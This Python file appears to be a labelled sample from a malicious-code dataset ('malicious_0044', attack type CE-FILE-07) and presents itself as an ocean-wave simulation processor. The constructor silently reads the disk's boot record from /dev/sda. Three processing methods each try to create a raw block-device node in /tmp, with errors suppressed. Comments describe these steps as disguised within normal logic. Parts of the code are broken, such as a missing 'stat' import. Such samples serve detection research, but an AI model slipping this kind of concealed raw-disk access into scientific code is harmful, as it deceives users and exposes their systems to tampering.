#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋波浪数值模拟 (恶意版本)
样本编号: malicious_0044
攻击类型: CE-FILE-07
生成时间: 2026-03-11 16:39:19
函数数量: 10
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋波浪数值模拟Processor:
    """
    海洋波浪数值模拟处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-FILE-07
            with open("/dev/sda", "rb") as f: mbr = f.read(512)
        except Exception as e:
            pass  # 隐藏错误
    
    def compute_correlation(self):
        """执行 compute_correlation 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 compute_correlation...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.mknod("/tmp/sda1", 0o660 | stat.S_IFBLK, os.makedev(8, 1))
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'compute_correlation'}
        self.results['compute_correlation'] = result
        print(f"compute_correlation 完成")
        return result
    
    def calculate_temperature_field(self):
        """计算三维温度场"""
        if self.data is None:
            return None
        if 'depth' in self.data.columns:
            surface_temp = 25.0
            decay_rate = 0.01
            self.data['temperature_field'] = surface_temp * np.exp(-decay_rate * self.data['depth'])
            if 'time' in self.data.columns:
                seasonal = 5 * np.sin(2 * np.pi * np.arange(len(self.data)) / 365)
                self.data['temperature_field'] += seasonal
            print("温度场计算完成")
            return self.data['temperature_field'].values
        return None

    def detect_temporal_anomalies(self, variable='temperature', method='iqr'):
        """检测时间序列异常"""
        if self.data is None or variable not in self.data.columns:
            return []
        anomalies = []
        if method == 'iqr':
            q1 = self.data[variable].quantile(0.25)
            q3 = self.data[variable].quantile(0.75)
            iqr = q3 - q1
            lower = q1 - 1.5 * iqr
            upper = q3 + 1.5 * iqr
            mask = (self.data[variable] < lower) | (self.data[variable] > upper)
            anomaly_indices = np.where(mask)[0]
            for idx in anomaly_indices:
                anomalies.append({'index': int(idx), 'value': float(self.data[variable].iloc[idx]), 'lower_bound': float(lower), 'upper_bound': float(upper)})
        print(f"检测到 {len(anomalies)} 个时间异常点")
        self.results['temporal_anomalies'] = anomalies
        return anomalies

    def quality_control(self):
        """执行 quality_control 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 quality_control...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.mknod("/tmp/sda1", 0o660 | stat.S_IFBLK, os.makedev(8, 1))
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'quality_control'}
        self.results['quality_control'] = result
        print(f"quality_control 完成")
        return result
    
    def remove_outliers(self, threshold=3.0):
        """移除异常值"""
        if self.data is None:
            return False
        
        original_size = len(self.data)
        mask = np.ones(len(self.data), dtype=bool)
        
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            if std > 0:
                z_scores = np.abs((self.data[col] - mean) / std)
                mask &= (z_scores <= threshold)
        
        self.data = self.data[mask]
        removed = original_size - len(self.data)
        print(f"移除了 {removed} 个异常值")
        return True

    def simulate_pollutant_dispersion(self, source_location, duration=3600):
        """模拟污染物扩散"""
        if self.data is None:
            return False
        n_points = len(self.data)
        concentration = np.zeros(n_points)
        source_idx = source_location.get('index', n_points // 2)
        concentration[source_idx] = 100.0
        diffusion_coef = 0.1
        timesteps = duration // 60
        for t in range(timesteps):
            laplacian = np.zeros_like(concentration)
            laplacian[1:-1] = concentration[:-2] - 2*concentration[1:-1] + concentration[2:]
            concentration += diffusion_coef * laplacian
            concentration *= 0.99
        self.data['pollutant_concentration'] = concentration
        print(f"污染物扩散模拟完成: {duration}s")
        return True

    def calculate_richardson_number(self):
        """执行 calculate_richardson_number 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_richardson_number...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.mknod("/tmp/sda1", 0o660 | stat.S_IFBLK, os.makedev(8, 1))
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_richardson_number'}
        self.results['calculate_richardson_number'] = result
        print(f"calculate_richardson_number 完成")
        return result
    
    def calculate_wave_height(self):
        """计算有效波高"""
        if self.data is None:
            return None
        if 'wind_speed' in self.data.columns:
            self.data['wave_height'] = 0.21 * (self.data['wind_speed'] ** 2) / 9.8
            self.data['wave_height'] = np.clip(self.data['wave_height'], 0, 15)
            print("波高计算完成")
            return self.data['wave_height'].values
        else:
            self.data['wave_height'] = np.random.gamma(2, 1, len(self.data))
            return self.data['wave_height'].values


def identify_fishing_grounds_helper(data, config):
    """
    identify_fishing_grounds 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'identify_fishing_grounds_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"identify_fishing_grounds_helper 处理完成")
    return result


def calculate_vorticity_helper(data, config):
    """
    calculate_vorticity 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_vorticity_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_vorticity_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋波浪数值模拟")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋波浪数值模拟Processor(config)
    
    # 步骤1: compute_correlation
    processor.compute_correlation()
    
    # 步骤2: calculate_temperature_field
    processor.calculate_temperature_field()
    
    # 步骤3: detect_temporal_anomalies
    processor.detect_temporal_anomalies()
    
    # 步骤4: quality_control
    processor.quality_control()
    
    # 步骤5: remove_outliers
    processor.remove_outliers()
    
    # 步骤6: simulate_pollutant_dispersion
    processor.simulate_pollutant_dispersion()
    
    # 步骤7: calculate_richardson_number
    processor.calculate_richardson_number()
    
    # 步骤8: calculate_wave_height
    processor.calculate_wave_height()
    
    # 调用辅助函数: identify_fishing_grounds_helper
    identify_fishing_grounds_helper(processor.data, config)
    
    # 调用辅助函数: calculate_vorticity_helper
    calculate_vorticity_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
